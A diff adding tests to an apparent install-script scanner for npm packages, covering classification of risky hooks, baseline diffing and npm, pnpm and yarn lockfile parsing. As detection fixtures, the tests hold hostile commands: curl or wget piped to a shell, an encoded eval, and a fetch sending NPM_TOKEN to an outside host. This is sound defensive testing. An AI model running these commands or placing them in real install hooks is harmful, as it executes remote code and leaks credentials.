@@ -121,3 +121,100 @@ test("parseArgs handles flags, inline values and defaults", () => {
   });
   assert.equal(parseArgs(["scan", "--min-risk=high"]).flags["min-risk"], "high");
 });
+
+// ---------------------------------------------------------------------------
+// v0.2.0: baseline diffing, extra lockfile formats, hardened classifier
+// ---------------------------------------------------------------------------
+
+import { toBaseline, diffBaseline, readBaseline, writeBaseline } from "../src/baseline.js";
+import { parsePnpmLock, parseYarnLock, parseNpmLock, readAnyLock } from "../src/lockfiles.js";
+
+test("classifyScript flags obfuscation, exfil and pipe-to-shell above everything else", () => {
+  assert.equal(classifyScript("curl https://x.example/a.sh | bash").category, "pipe-to-shell");
+  assert.equal(classifyScript("wget -qO- http://x/y | sudo sh").risk, "high");
+  // A payload dressed up as a funding banner must not be downgraded to 'low'.
+  assert.equal(classifyScript("node -e \"eval(atob('ZXZpbA=='))\" # thanks for installing!").risk, "high");
+  assert.equal(classifyScript("node -e 'require(\"child_process\").exec(1)'").category, "obfuscated-exec");
+  assert.equal(
+    classifyScript("node -e \"fetch('https://x.example?t='+process.env.NPM_TOKEN)\"").category,
+    "credential-exfil",
+  );
+  // Legitimate cases keep their existing classification.
+  assert.equal(classifyScript("node-gyp rebuild").category, "native-build");
+  assert.equal(classifyScript("node ./opencollective.js").category, "funding-nag");
+});
+
+test("diffBaseline reports added, changed and removed install scripts", async () => {
+  const dir = await fixture();
+  const findings = await scanTree(dir);
+  const baseline = toBaseline(findings);
+
+  assert.equal(diffBaseline(findings, baseline).added.length, 0);
+  assert.equal(diffBaseline(findings, baseline).changed.length, 0);
+
+  // A hijacked release rewrites its own postinstall at a new version.
+  const tampered = findings.map((f) =>
+    f.name === "sharp"
+      ? { ...f, version: "0.33.1", risk: "high", scripts: [{ hook: "install", command: "curl https://evil | sh", category: "pipe-to-shell", risk: "high" }] }
+      : f,
+  );
+  const diff = diffBaseline(tampered, baseline);
+  assert.equal(diff.changed.length, 1);
+  assert.equal(diff.changed[0].name, "sharp");
+  assert.deepEqual(diff.changed[0].reasons.sort(), ["risk", "script", "version"]);
+
+  // A brand new package with a hook shows up as added; a dropped one as removed.
+  const withNew = [...findings, { name: "newbie", version: "1.0.0", risk: "medium", scripts: [{ hook: "postinstall", command: "node x.js", category: "script-exec", risk: "medium" }] }];
+  assert.equal(diffBaseline(withNew, baseline).added[0].name, "newbie");
+  assert.equal(diffBaseline(findings.filter((f) => f.name !== "sneaky"), baseline).removed[0].name, "sneaky");
+});
+
+test("baseline round-trips through .installguard.json", async () => {
+  const dir = await fixture();
+  const findings = await scanTree(dir);
+  await writeBaseline(dir, findings);
+  const loaded = await readBaseline(dir);
+  assert.equal(loaded.version, 1);
+  assert.deepEqual(diffBaseline(findings, loaded), { added: [], changed: [], removed: [] });
+  assert.equal(await readBaseline(await mkdtemp(path.join(tmpdir(), "empty-"))), null);
+});
+
+test("lockfile readers parse npm, pnpm and yarn formats", async () => {
+  const npm = parseNpmLock(JSON.stringify({
+    lockfileVersion: 3,
+    packages: { "": { name: "app" }, "node_modules/lodash": { version: "4.17.21" }, "node_modules/@scope/x": { version: "1.0.0", dev: true } },
+  }));
+  assert.deepEqual(npm.map((d) => `${d.name}@${d.version}`).sort(), ["@scope/x@1.0.0", "lodash@4.17.21"]);
+
+  const pnpm = parsePnpmLock([
+    "lockfileVersion: '6.0'",
+    "packages:",
+    "  /lodash@4.17.21:",
+    "    resolution: {integrity: sha512-x}",
+    "  /@scope/pkg@1.2.3(react@18.0.0):",
+    "    dev: false",
+  ].join("\n"));
+  assert.deepEqual(pnpm.map((d) => `${d.name}@${d.version}`).sort(), ["@scope/pkg@1.2.3", "lodash@4.17.21"]);
+
+  const yarn = parseYarnLock([
+    "# yarn lockfile v1",
+    "",
+    'lodash@^4.17.0, lodash@^4.17.21:',
+    '  version "4.17.21"',
+    '  resolved "https://registry.yarnpkg.com/lodash/-/lodash-4.17.21.tgz"',
+    "",
+    '"@scope/pkg@^1.0.0":',
+    '  version "1.2.3"',
+  ].join("\n"));
+  assert.deepEqual(yarn.map((d) => `${d.name}@${d.version}`).sort(), ["@scope/pkg@1.2.3", "lodash@4.17.21"]);
+});
+
+test("readAnyLock picks up a pnpm project and errors clearly when none exists", async () => {
+  const dir = await mkdtemp(path.join(tmpdir(), "installguard-lock-"));
+  await assert.rejects(() => readAnyLock(dir), /no lockfile found/);
+  await writeFile(path.join(dir, "pnpm-lock.yaml"), "packages:\n  /left-pad@1.3.0:\n    dev: false\n");
+  const found = await readAnyLock(dir);
+  assert.equal(found.manager, "pnpm");
+  assert.equal(found.lockfile, "pnpm-lock.yaml");
+  assert.deepEqual(found.deps, [{ name: "left-pad", version: "1.3.0", dev: false }]);
+});
